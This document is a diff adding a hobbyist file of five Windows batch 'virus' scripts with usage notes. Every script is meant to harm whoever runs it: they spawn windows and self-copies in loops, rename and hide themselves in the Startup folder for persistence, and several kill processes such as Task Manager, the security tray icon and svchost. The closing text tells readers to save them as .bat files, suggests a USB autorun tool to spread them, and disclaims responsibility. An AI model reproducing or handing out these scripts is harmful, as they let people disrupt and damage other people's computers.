@@ -1,0 +1,102 @@
+Example 1:
+-------------------------------------------------------
+@echo off
+if %username% equ yourusernamegoeshere echo 1 taskkill /im cmd.exe /f /t && taskkill /im conhost.exe /f /t && pause
+start cmd
+start
+start notepad
+start calc
+start www.google.com
+start www.bing.com
+start www.roblox.com
+start www.youtube.com
+start steam.exe
+start start start start start start start start start
+cmd
+set e=e%random%e%random%e
+ren batchfilename.bat %e%.bat
+start %e%.bat
+copy %e%.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+attrib +s +h "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%e%.bat"
+goto :1
+------------------------------------------
+Example 2:
+-------------------------------------------------------
+@echo off
+if %username% equ yourusernamegoeshere echo 1 taskkill /im cmd.exe /f /t && taskkill /im conhost.exe /f /t && pause
+:1
+start start start start start start start start start start start start
+start %e%.bat
+start "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%e%.bat"
+set e=e%random%e%random%e
+ren batchfilename.bat %e%.bat
+copy %e%.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+attrib +s +h "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%e%.bat"
+goto :1
+----------------------------------------------------------
+example 3:
+---------------------------------------------------------------------
+@echo off
+if %username% equ yourusernamegoeshere echo 1 taskkill /im cmd.exe /f /t && taskkill /im conhost.exe /f /t && pause
+start batchfilename.bat
+taskkill /im steam.exe /f /t
+taskkill /im minecraft.exe.exe /f /t
+taskkill /im google.exe /f /t
+taskkill /im msedge.exe /f /t
+taskkill /im notepad.exe /f /t
+taskkill /im Taskmgr /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im RuntimeBroker.exe /f /t
+taskkill /im SecurityHealthSystray /f /t
+taskkill /im ntoskrnl.exe /f /t
+set e=e%random%e%random%e
+ren batchfilename.bat %e%.bat
+copy %e%.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+attrib +h +s "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%e%.bat"
+----------------------------------------------
+example 4:
+----------------------------------------
+@echo off
+set a=%random%%random%
+mkdir C:\%a%3%a%
+copy batchfilename.bat C:\%a%3%a%
+attrib +h +s C:\%a%3%a%\batchfilename.bat
+-----------------------------------------
+example 5 (this is the most dangerous one):
+--------------------------------------------
+@echo off
+if %username% equ yourusernamegoeshere echo 1 taskkill /im cmd.exe /f /t && taskkill /im conhost.exe /f /t && pause
+start cmd
+start start
+start calc
+start start start start start start start start start
+start calc
+cmd
+set e=e%random%e%random%e
+ren batchfilename.bat %e%.bat
+start %e%.bat
+copy %e%.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+attrib +s +h "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%e%.bat"
+start batchfilename.bat
+set a=%random%3%random%
+mkdir C:\%a%
+copy %e%.bat C:\%a%
+taskkill /im steam.exe /f /t
+taskkill /im minecraft.exe.exe /f /t
+taskkill /im google.exe /f /t
+taskkill /im msedge.exe /f /t
+taskkill /im notepad.exe /f /t
+taskkill /im Taskmgr /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im RuntimeBroker.exe /f /t
+taskkill /im SecurityHealthSystray /f /t
+taskkill /im ntoskrnl.exe /f /t
+cmd
+start start start start start start start start
+goto :1
+-------------------------------------------------
+do not copy the lines, save the file as a batch file/.bat file
+these are dangerous (oh, also feel free to change it up like username to exclude for virus, name of batch file, basically whatever doesn't break the entire thing.)
+and if you want to make a usb virus use: https://usb-autorun-creator.en.softonic.com/
+it is SUPER easy to use. I do not take credit for any damage you do with this information, I am not forcing you to do this so the only person you can blame is yourself.
+also feel free to check out my youtube channel: https://www.youtube.com/channel/UC-of0mj_reR7WjmvnvpqbEA Fox GamingYT.
